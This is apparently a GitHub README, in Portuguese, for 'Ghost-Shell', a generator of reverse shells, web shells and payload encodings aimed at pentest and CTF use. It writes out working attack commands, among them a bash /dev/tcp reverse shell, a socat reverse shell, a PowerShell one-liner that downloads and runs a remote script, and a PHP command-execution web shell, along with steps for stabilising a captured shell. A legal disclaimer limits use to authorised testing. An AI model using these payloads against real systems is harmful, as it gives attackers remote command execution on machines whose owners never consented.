# Ghost-Shell

> By Gh0st-Bx1 | [github.com/Ghost-Bx1](https://github.com/Ghost-Bx1)

Gerador completo de reverse shells, web shells e encoders para pentest e CTF. Suporta 25+ linguagens, 9 tipos de web shell e multiplos formatos de encoding.

---

## Funcionalidades

| Modulo | Descricao |
|---|---|
| `gen` | Gerar payload de reverse shell para IP/porta especificados |
| `webshell` | Gerar web shell (PHP, ASP, ASPX, JSP, Node.js) |
| `encode` | Codificar payload em Base64, URL, Hex e outros formatos |
| `list` | Listar todos os shells e tipos de web shell disponiveis |

---

## Shells suportados (`gen`)

| Tipo | Descricao |
|---|---|
| `bash` | Bash TCP redirect |
| `bash_196` | Bash com file descriptor 196 |
| `bash_udp` | Bash UDP |
| `sh` | /bin/sh TCP |
| `nc` | Netcat tradicional |
| `nc_openbsd` | Netcat OpenBSD (sem -e) |
| `nc_windows` | Netcat Windows |
| `python2` | Python 2 socket |
| `python3` | Python 3 socket |
| `php` | PHP one-liner |
| `php_shell` | PHP shell_exec |
| `perl` | Perl socket |
| `ruby` | Ruby TCPSocket |
| `golang` | Go net.Conn |
| `java` | Java Runtime.exec |
| `groovy` | Groovy (Jenkins) |
| `nodejs` | Node.js net.Socket |
| `lua` | Lua socket |
| `awk` | AWK /inet/tcp |
| `socat` | Socat exec |
| `socat_static` | Socat PTY estatico |
| `powershell` | PowerShell TCP |
| `powershell_b64` | PowerShell Base64 encoded |
| `cmd_certutil` | CMD + certutil download |
| `msfvenom_hint` | Comando msfvenom sugerido |

---

## Web shells suportados (`webshell`)

| Tipo | Descricao |
|---|---|
| `php_cmd` | PHP system() simples |
| `php_passthru` | PHP passthru() |
| `php_shell_exec` | PHP shell_exec() |
| `php_senha` | PHP com autenticacao MD5 |
| `php_upload` | PHP com upload de arquivo |
| `asp_classic` | ASP classico |
| `aspx` | ASP.NET C# |
| `jsp` | Java Server Pages |
| `nodejs` | Node.js Express handler |

---

## Instalacao

```bash
# Sem dependencias obrigatorias - stdlib Python 3 apenas
python ghost-shell.py --help
```

Para iniciar listener automatico:
```bash
# nc ou ncat devem estar no PATH
which nc ncat
```

---

## Uso

```bash
# Listar todos os shells disponiveis
python ghost-shell.py list

# Gerar payload bash para IP/porta
python ghost-shell.py gen -i 10.10.10.5 -p 4444

# Gerar shell especifico
python ghost-shell.py gen -i 10.10.10.5 -p 4444 -s python3

# Gerar todos os shells de uma vez
python ghost-shell.py gen -i 10.10.10.5 -p 4444 --all

# Gerar e iniciar listener automaticamente
python ghost-shell.py gen -i 10.10.10.5 -p 4444 -s bash --listen

# Web shell PHP simples
python ghost-shell.py webshell -t php_cmd

# Web shell PHP com senha
python ghost-shell.py webshell -t php_senha --senha minhasenha

# Web shell ASPX
python ghost-shell.py webshell -t aspx

# Salvar web shell em arquivo
python ghost-shell.py webshell -t php_cmd -o shell.php

# Codificar payload em base64
python ghost-shell.py encode -d "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" -e base64

# Codificar em URL encoding
python ghost-shell.py encode -d "<?php system(\$_GET['cmd']); ?>" -e url

# Codificar em hex
python ghost-shell.py encode -d "payload aqui" -e hex

# Base64 UTF-16LE (PowerShell)
python ghost-shell.py encode -d "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/shell.ps1')" -e base64_utf16
```

---

## Saida exemplo

```
  Ghost-Shell v1.0.0  |  Reverse Shell & Web Shell Generator

  [=] REVERSE SHELLS  |  IP: 10.10.10.5  |  PORTA: 4444

  [bash]
  bash -i >& /dev/tcp/10.10.10.5/4444 0>&1

  [python3]
  python3 -c 'import socket,subprocess,os;s=socket.socket(...)...'

  [php]
  php -r '$sock=fsockopen("10.10.10.5",4444);...'

  [powershell_b64]
  powershell -enc JABjAGwAaQBlAG4AdAAgAD0A...

  [=] ESTABILIZACAO DO SHELL
  1. python3 -c 'import pty;pty.spawn("/bin/bash")'
  2. Ctrl+Z -> stty raw -echo; fg
  3. export TERM=xterm
```

---

## Opcoes completas

### `gen` - Gerar reverse shell

```
opcoes:
  -i IP                 IP para conexao reversa (seu IP)
  -p PORTA              Porta para conexao reversa
  -s SHELL              Tipo de shell especifico (default: mostrar todos)
  --all                 Mostrar todos os shells disponiveis
  --listen              Iniciar listener nc/ncat apos gerar
```

### `webshell` - Gerar web shell

```
opcoes:
  -t TIPO               Tipo: php_cmd, php_passthru, php_shell_exec, php_senha,
                        php_upload, asp_classic, aspx, jsp, nodejs
  --senha SENHA         Senha para autenticacao (php_senha)
  -o FILE               Salvar em arquivo
```

### `encode` - Codificar payload

```
opcoes:
  -d DADOS              Payload a codificar
  -e ENCODING           Tipo: base64, base64_utf16, url, double_url, hex
```

### `list` - Listar shells

```
  Sem argumentos - lista todos os shells e web shells disponiveis
```

---

## Tecnicas de estabilizacao de shell

Apos receber a conexao reversa:

```bash
# 1. Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# 2. Socat interativo (upload socat estatico no alvo)
socat file:`tty`,raw,echo=0 tcp-listen:4445
# No alvo:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:SEU_IP:4445

# 3. script /dev/null
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg

# 4. rlwrap
rlwrap nc -lvnp 4444
```

---

## Aviso Legal

Uso exclusivo para pesquisa de seguranca, pentest autorizado, CTF e fins educacionais. O uso nao autorizado contra sistemas de terceiros e ilegal. Os autores nao se responsabilizam pelo uso indevido.
